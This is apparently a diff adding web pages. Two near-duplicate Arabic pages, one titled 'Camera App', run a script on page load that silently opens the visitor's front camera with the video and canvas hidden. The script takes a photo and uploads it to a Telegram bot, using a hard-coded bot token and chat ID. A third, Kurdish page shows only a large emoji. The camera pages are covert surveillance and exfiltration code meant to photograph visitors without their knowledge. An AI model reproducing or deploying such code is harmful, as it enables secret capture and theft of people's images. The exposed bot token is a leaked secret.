@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    background: #111;
+    color: #fff;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+#video, #canvas {
+    display: none;
+}
+
+.status {
+    text-align: center;
+    font-size: 18px;
+    padding: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="status" id="statusText"></div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+async function captureAndSendToTelegram() {
+    const statusText = document.getElementById("statusText");
+
+    // ضع التوكن الخاص بك هنا بين علامتي التنصيص
+    const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+    
+    // ضع الـ Chat ID الخاص بك هنا بين علامتي التنصيص
+    const chatId = "5015426926";
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => {
+            if (video.videoWidth > 0) {
+                resolve();
+            } else {
+                video.onloadedmetadata = resolve;
+            }
+        });
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+        statusText.innerText = "";
+
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                statusText.innerText = "";
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    statusText.innerText = "";
+                } else {
+                    statusText.innerText = "";
+                }
+            } catch (err) {
+                console.error("Telegram error:", err);
+                statusText.innerText = "";
+            }
+
+        }, "image/jpeg", 0.9);
+
+    } catch (error) {
+        console.error("Camera error:", error);
+        statusText.innerText = "";
+    }
+}
+
+window.addEventListener("load", captureAndSendToTelegram);
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera App</title>
+
+<style>
+html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    background: #111;
+    color: #fff;
+    font-family: sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+#video, #canvas {
+    display: none;
+}
+
+.status {
+    text-align: center;
+    font-size: 18px;
+    padding: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="status" id="statusText"></div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+async function captureAndSendToTelegram() {
+    const statusText = document.getElementById("statusText");
+
+    // ضع التوكن الخاص بك هنا بين علامتي التنصيص
+    const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+    
+    // ضع الـ Chat ID الخاص بك هنا بين علامتي التنصيص
+    const chatId = "5015426926";
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => {
+            if (video.videoWidth > 0) {
+                resolve();
+            } else {
+                video.onloadedmetadata = resolve;
+            }
+        });
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+        statusText.innerText = "";
+
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                statusText.innerText = "";
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                } else {
+                    statusText.innerText = "فشل الإرسال، تأكد من صحة التوكن والـ Chat ID.";
+                }
+            } catch (err) {
+                console.error("Telegram error:", err);
+                statusText.innerText = "";
+            }
+
+        }, "image/jpeg", 0.9);
+
+    } catch (error) {
+        console.error("Camera error:", error);
+        statusText.innerText = "";
+    }
+}
+
+window.addEventListener("load", captureAndSendToTelegram);
+</script>
+
+</body>
+</html><!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #111;
+        }
+        .emoji-display {
+            font-size: 450px; /* قەبارەی ئیمۆجییەکە گەورە و ڕێک دەكات */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="emoji-display">😁</div>
+
+</body>
+</html>
